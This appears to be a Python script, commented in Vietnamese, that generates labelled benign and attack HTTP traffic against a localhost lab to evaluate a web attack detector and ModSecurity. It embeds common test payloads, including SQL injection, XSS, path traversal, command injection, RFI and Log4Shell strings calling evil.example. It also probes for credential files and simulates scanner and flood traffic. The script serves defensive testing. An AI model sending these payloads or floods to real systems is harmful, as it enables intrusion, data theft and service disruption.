"""Sinh lưu lượng HTTP có nhãn cho thực nghiệm (chỉ thư viện chuẩn Python, tái lập được theo seed).

Mỗi request mang cookie `sessionid=<request_id>`: Nginx ghi vào trường sid, C3 đưa thành session_id,
detector giữ session_id trong mọi kết quả, nhờ đó ghép kết quả với nhãn. IP nguồn giả lập qua
X-Forwarded-For (vhost lab.local tin header này từ dải mạng nội bộ).

  python3 experiments/traffic.py --target http://127.0.0.1:8081 --labels experiments/results/labels.jsonl
  python3 experiments/traffic.py --target http://127.0.0.1:8088 --req-id-header ...   # gửi qua ModSecurity

Chỉ gửi tới máy cục bộ (127.0.0.1/localhost). Payload là mẫu kiểm thử phổ biến, không khai thác thật.
"""
import argparse
import json
import random
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from concurrent.futures import ThreadPoolExecutor

LOCAL_TARGET_PREFIXES = ("http://127.0.0.1:", "http://localhost:")

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 9; SH-03K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi Note 9) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
]
CRAWLER_UA = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
SCANNER_UAS = ["sqlmap/1.8.4#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)",
               "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"]

ASSETS = ["/assets/app.css", "/assets/app.js", "/assets/logo.svg", "/favicon.ico"]
# Giá trị hợp lệ nhưng dễ gây nhầm cho rule (dấu nháy, từ khoá SQL trong văn bản, tên tham số có "on"...).
BENIGN_SEARCHES = ["laptop", "O'Brien", "rock & roll", "select a plan", "union station", "how to order by price",
                   "C++ tutorial", "50% off", "<3 love it", "and or not", "1=1 math lesson", "drop shipping",
                   "script writing course", "iframe size css", "onload event tutorial", "../ relative path docs"]
BENIGN_API = ["/api/products?id={n}", "/api/cart", "/api/products?category=phones&page={n}",
              "/api/login?redirect_url=https%3A%2F%2Flab.local%2Faccount", "/api/settings?config=dark&content=hello",
              "/api/products?condition=new&contact=1", "/api/download?file=report-{n}.pdf",
              "/api/return?return_url=https://lab.local/p/{n}", "/api/img?img_src=https://cdn.lab.local/{n}.png"]

# (nhóm, giá trị tham số q đã mã hoá sẵn hoặc None, đường dẫn đầy đủ nếu tấn công nằm ở path)
PAYLOADS = {
    "sql_injection": ["1' OR '1'='1", "1 OR 1=1", "' OR 1=1--", "1 UNION SELECT username,password FROM users--",
                      "1 UNION ALL SELECT NULL,version()--", "1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
                      "admin'--", "1/**/UNION/**/SELECT/**/1,2", "1\tUNION\tSELECT\t1", "-1' ORDER BY 3--",
                      "1' AND extractvalue(1,concat(0x7e,(SELECT database())))--"],
    "xss": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
            "javascript:alert(document.domain)", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>", "'-alert(1)-'"],
    "path_traversal": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
                       "..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd"],
    "command_injection": ["1;cat /etc/passwd", "1|id", "$(whoami)", "`uname -a`", "1&&ls -la",
                          "127.0.0.1; ping -c 1 evil.example"],
    "lfi": ["php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "/proc/self/environ"],
    "rfi": ["http://evil.example/shell.txt", "https://evil.example/x.php"],
    "log4shell": ["${jndi:ldap://evil.example/a}", "${jndi:dns://evil.example/b}"],
    "ssti": ["{{7*7}}", "{{config.items()}}", "${7*7}"],
}
# Giá trị đã mã hoá sẵn (giữ nguyên trong URL), còn lại được percent-encode.
PRE_ENCODED = {"..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd"}
PARAM_FOR = {"rfi": "page", "lfi": "file", "path_traversal": "file", "command_injection": "host"}
SENSITIVE_PATHS = ["/.env", "/.git/config", "/wp-config.php.bak", "/backup.sql", "/.htpasswd", "/phpinfo.php"]
SCAN_PATHS = ["/admin", "/admin/login", "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/pma/", "/manager/html",
              "/server-status", "/actuator/health", "/actuator/env", "/console", "/debug", "/test", "/old", "/dev",
              "/api/v1/users", "/api/internal", "/backup.zip", "/site.tar.gz", "/db.sql", "/config.php", "/config.yml",
              "/.svn/entries", "/.DS_Store", "/cgi-bin/test.cgi", "/shell.php", "/upload.php", "/xmlrpc.php",
              "/jenkins/", "/solr/", "/druid/index.html", "/owa/", "/remote/login", "/vpn/index.html",
              "/HNAP1/", "/boaform/admin/formLogin", "/setup.cgi", "/login.action", "/struts/webconsole.html",
              "/telescope/requests", "/_profiler/", "/elmah.axd", "/trace.axd", "/web.config", "/install.php",
              "/README.md", "/CHANGELOG.txt", "/composer.json", "/package.json", "/Dockerfile", "/id_rsa",
              "/storage/logs/laravel.log", "/api/swagger.json", "/graphql", "/v2/api-docs", "/metrics", "/.aws/credentials"]


class Plan:
    """Kế hoạch request theo thời gian (giây tính từ lúc bắt đầu), tạo xác định theo seed."""

    def __init__(self, seed, run):
        self.rng = random.Random(seed)
        self.run = run
        self.requests = []

    def rid(self):
        """request_id = <run>-<uuid>: cùng seed + run cho cùng ID (so sánh với ModSecurity), run khác thì
        không lẫn với dữ liệu của lần chạy trước còn trong Kafka."""
        return f"{self.run}-{uuid.UUID(int=self.rng.getrandbits(128), version=4)}"

    def add(self, t, ip, path, ua, label, category, referer=""):
        self.requests.append({"t": round(t, 3), "request_id": self.rid(), "ip": ip, "path": path, "ua": ua,
                              "referer": referer, "label": label, "category": category})

    def page_load(self, t, ip, ua, page, with_assets):
        self.add(t, ip, page, ua, "benign", "benign")
        if with_assets:
            for i, asset in enumerate(ASSETS):
                self.add(t + 0.05 * (i + 1), ip, asset, ua, "benign", "benign", referer="https://lab.local" + page)

    def benign_page(self):
        r = self.rng
        kind = r.random()
        if kind < 0.3:
            return f"/p/{r.randint(1, 500)}"
        if kind < 0.45:
            return f"/c/{r.choice(['phones', 'laptops', 'audio', 'books'])}"
        if kind < 0.6:
            return f"/blog/{r.choice(['shipping', 'returns', 'new-arrivals', 'tips'])}-{r.randint(1, 40)}"
        if kind < 0.8:
            return "/search?q=" + urllib.parse.quote(r.choice(BENIGN_SEARCHES), safe="")
        return r.choice(BENIGN_API).format(n=r.randint(1, 300))


def payload_path(rng, category):
    if category == "sensitive_file":
        return rng.choice(SENSITIVE_PATHS)
    value = rng.choice(PAYLOADS[category])
    encoded = value if value in PRE_ENCODED else urllib.parse.quote(value, safe="")
    if category == "path_traversal" and rng.random() < 0.3:
        return "/static/" + (value if value in PRE_ENCODED else value.replace("\\", "%5C"))
    if category == "log4shell" and rng.random() < 0.5:
        return None  # payload trong User-Agent
    param = PARAM_FOR.get(category, "q")
    base = rng.choice(["/api/products", "/search", "/api/view", "/api/load"])
    return f"{base}?{param}={encoded}"


def build_plan(seed, run, duration, benign_ips, attackers, scanners, flooders):
    plan = Plan(seed, run)
    r = plan.rng
    # Người dùng bình thường: vài lần tải trang, nghỉ 3–15 giây giữa các trang.
    for n in range(benign_ips):
        ip, ua = f"198.51.100.{n + 10}", r.choice(BROWSER_UAS)
        t = r.uniform(0, duration * 0.8)
        for page_index in range(r.randint(2, 7)):
            plan.page_load(t, ip, ua, "/" if page_index == 0 else plan.benign_page(), with_assets=page_index == 0)
            if r.random() < 0.1:
                plan.add(t + 0.3, ip, f"/old-page-{r.randint(1, 9)}", ua, "benign", "benign")  # link hỏng -> 404
            t += r.uniform(3, 15)
    # Khách hợp lệ nhiều request: ứng dụng gọi API liên tục (~30–45 request/phút).
    for n in range(3):
        ip, ua = f"198.51.100.{200 + n}", r.choice(BROWSER_UAS)
        t = r.uniform(0, duration * 0.4)
        for _ in range(r.randint(40, 70)):
            plan.add(t, ip, "/api/notifications?since=" + str(int(t)), ua, "benign", "benign")
            t += r.uniform(1.3, 2.0)
    # Bot tìm kiếm hợp lệ: duyệt nhiều trang khác nhau (~1 trang/giây), thỉnh thoảng gặp 404.
    for n in range(2):
        ip = f"66.249.66.{n + 1}"
        t = r.uniform(0, duration * 0.5)
        for _ in range(45):
            path = plan.benign_page() if r.random() > 0.05 else f"/old-page-{r.randint(1, 30)}"
            plan.add(t, ip, path, CRAWLER_UA, "benign", "benign")
            t += r.uniform(0.8, 1.6)
    # Kẻ tấn công payload: xen kẽ duyệt bình thường và payload thuộc nhiều nhóm.
    categories = list(PAYLOADS) + ["sensitive_file"]
    for n in range(attackers):
        ip, ua = f"203.0.113.{n + 10}", r.choice(BROWSER_UAS)
        t = r.uniform(0, duration * 0.8)
        focus = r.sample(categories, k=r.randint(2, 4))
        for _ in range(r.randint(6, 18)):
            if r.random() < 0.25:
                plan.add(t, ip, plan.benign_page(), ua, "benign", "benign")
            else:
                category = r.choice(focus)
                path = payload_path(r, category)
                if path is None:
                    plan.add(t, ip, "/api/products?id=" + str(r.randint(1, 9)), r.choice(PAYLOADS["log4shell"]),
                             "attack", "log4shell")
                else:
                    plan.add(t, ip, path, ua, "attack", category)
            t += r.uniform(1, 6)
    # Công cụ quét: đúng User-Agent của công cụ (một nửa) hoặc giả trình duyệt; dò thư mục nhanh.
    for n in range(scanners):
        ip = f"192.0.2.{n + 10}"
        ua = SCANNER_UAS[n % len(SCANNER_UAS)] if n % 2 == 0 else r.choice(BROWSER_UAS)
        t = r.uniform(0, duration * 0.7)
        for path in r.sample(SCAN_PATHS, k=min(len(SCAN_PATHS), r.randint(35, 55))):
            plan.add(t, ip, path, ua, "attack", "scan")
            t += r.uniform(0.2, 0.6)
    # HTTP flood không payload: ~150–200 request/phút vào trang chủ hoặc API.
    for n in range(flooders):
        ip, ua = f"192.0.2.{100 + n}", r.choice(BROWSER_UAS)
        t = r.uniform(0, duration * 0.6)
        target = r.choice(["/", "/api/products?id=1"])
        for _ in range(r.randint(150, 200)):
            plan.add(t, ip, target, ua, "attack", "flood")
            t += r.uniform(0.25, 0.4)
    plan.requests.sort(key=lambda item: item["t"])
    return plan.requests


def send(target, host, request, req_id_header, timeout=10):
    headers = {"Host": host, "User-Agent": request["ua"], "X-Forwarded-For": request["ip"],
               "Cookie": f"sessionid={request['request_id']}"}
    if request["referer"]:
        headers["Referer"] = request["referer"]
    if req_id_header:
        headers[req_id_header] = request["request_id"]
    req = urllib.request.Request(target + request["path"], headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            resp.read()
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code
    except Exception:  # lỗi mạng hoặc URL Nginx từ chối trước khi trả về
        return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default="http://127.0.0.1:8081")
    parser.add_argument("--host", default="lab.local")
    parser.add_argument("--labels", required=True, help="file JSONL ghi nhãn và mã phản hồi")
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--run", default="run", help="tiền tố request_id của lần chạy (chữ, số, dấu -)")
    parser.add_argument("--duration", type=float, default=150, help="độ dài kịch bản (giây)")
    parser.add_argument("--benign", type=int, default=80)
    parser.add_argument("--attackers", type=int, default=30)
    parser.add_argument("--scanners", type=int, default=4)
    parser.add_argument("--flooders", type=int, default=2)
    parser.add_argument("--req-id-header", default="", help="thêm header chứa request_id (dùng cho ModSecurity)")
    parser.add_argument("--dry-run", action="store_true", help="chỉ in thống kê kế hoạch")
    args = parser.parse_args()
    if not args.target.startswith(LOCAL_TARGET_PREFIXES):
        sys.exit("--target phải là http://127.0.0.1:<port> hoặc http://localhost:<port>")

    plan = build_plan(args.seed, args.run, args.duration, args.benign, args.attackers, args.scanners, args.flooders)
    counts = {}
    for item in plan:
        counts[item["category"]] = counts.get(item["category"], 0) + 1
    print(f"{len(plan)} request, kéo dài ~{plan[-1]['t']:.0f}s:", json.dumps(counts, ensure_ascii=False))
    if args.dry_run:
        return

    lock = threading.Lock()
    start = time.time()
    with open(args.labels, "w", encoding="utf-8") as out, ThreadPoolExecutor(max_workers=48) as pool:
        def run(item):
            status = send(args.target, args.host, item, args.req_id_header)
            with lock:
                out.write(json.dumps({**item, "status": status, "sent_at": time.time()}, ensure_ascii=False) + "\n")

        for item in plan:
            delay = start + item["t"] - time.time()
            if delay > 0:
                time.sleep(delay)
            pool.submit(run, item)
    print(f"đã gửi xong sau {time.time() - start:.0f}s, nhãn ghi tại {args.labels}")


if __name__ == "__main__":
    main()
